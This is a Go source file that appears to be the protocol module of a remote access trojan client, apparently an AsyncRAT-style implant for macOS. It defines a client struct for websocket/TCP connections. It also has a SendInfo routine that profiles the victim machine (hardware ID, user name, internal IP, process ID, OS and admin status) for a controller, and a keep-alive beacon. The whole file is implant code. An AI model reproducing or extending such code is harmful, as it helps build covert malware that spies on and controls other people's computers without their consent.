package Protocol

import (
	"bytes"
	"main/MessagePack"
	"main/PcInfo"
	"net"
	"sync"
	"time"

	"github.com/togettoyou/wsc"
)

type Client struct {
	Connection        *wsc.Wsc
	lock              sync.Mutex
	retryCount        int
	maxRetries        int
	Client            *net.TCPConn
	Buffer            []byte
	BufferSize        int64
	MS                bytes.Buffer
	IsConnected       bool
	SendSync          sync.Mutex
	ActivatePong      bool
	RemarkMessage     string
	RemarkClientColor string
	keepAlive         *time.Ticker
	// Implementing timers and ThreadPool would require more context and may need external libraries
}

func SendInfo() []byte {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientInfo")
	msgpack.ForcePathObject("OS").SetAsString(PcInfo.GetMacOSVersion())
	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
	msgpack.ForcePathObject("User").SetAsString(PcInfo.UserName)
	msgpack.ForcePathObject("LANip").SetAsString(PcInfo.GetInternalIP())
	msgpack.ForcePathObject("ProcessName").SetAsString(PcInfo.GetProcessName())
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.ProcessID)
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("SleepTime").SetAsString("10")
	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)
	msgpack.ForcePathObject("Admin").SetAsString("")
	msgpack.ForcePathObject("CLRVersion").SetAsString(PcInfo.ClrVersion)
	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.GetClientComputer())
	return msgpack.Encode2Bytes()
}

func KeepAlivePacket[T any](Connection T, SendData func([]byte, T)) {
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientPing")
	msgpack.ForcePathObject("Message").SetAsString("DDDD")

	SendData(msgpack.Encode2Bytes(), Connection)
}
